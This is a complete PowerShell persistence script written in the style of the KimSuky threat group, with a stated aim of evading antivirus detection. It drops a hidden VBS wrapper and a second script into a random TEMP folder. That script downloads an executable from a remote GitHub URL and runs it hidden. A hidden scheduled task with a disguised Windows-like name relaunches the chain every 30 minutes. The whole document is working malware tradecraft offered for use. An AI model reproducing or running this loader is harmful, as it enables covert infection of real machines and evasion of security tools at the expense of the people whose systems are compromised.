# persist.ps1 - KimSuky-style robust persistence, fuck Bearfoos on second reboot
$ErrorActionPreference = 'SilentlyContinue'

# Random folder in %TEMP% to blend in
$randFolder = [System.IO.Path]::GetRandomFileName()
$persistDir = "$env:TEMP\$randFolder"
New-Item -ItemType Directory -Path $persistDir -Force | Out-Null

$vbsPath = "$persistDir\update.vbs"
$psPath  = "$persistDir\sync.ps1"
$taskName = "Windows Cache Updater Task S-1-12-12-3-$(Get-Random -Min 100000000 -Max 999999999)BVSKLERh-SD$(Get-Random -Min 100 -Max 999)"

# VBS wrapper (runs PS hidden, parent = wscript.exe)
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$psPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

# The real persistent payload downloader/launcher
$psContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)

`$cache = "`$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path `$cache)) { New-Item -ItemType Directory -Path `$cache -Force | Out-Null }

`$exeUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe'  # your base64 one or direct
`$exePath = "`$cache\helper.exe"

if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100KB)) {
    try {
        Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
    } catch {}
}

# Launch via WScript again for clean parent
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run("`"`$exePath`"", 0, `$false)
} catch {
    Start-Process `$exePath -WindowStyle Hidden
}

# Optional: delete old copies after launch
Start-Sleep -Seconds 60
Get-ChildItem `$cache -Filter "*.exe" -Exclude "helper.exe" | Remove-Item -Force -ErrorAction SilentlyContinue
"@
$psContent | Out-File -FilePath $psPath -Encoding UTF8 -Force

# Create the scheduled task (KimSuky exact style)
$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbsPath`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 30)
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

# Optional: run it immediately for testing
Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
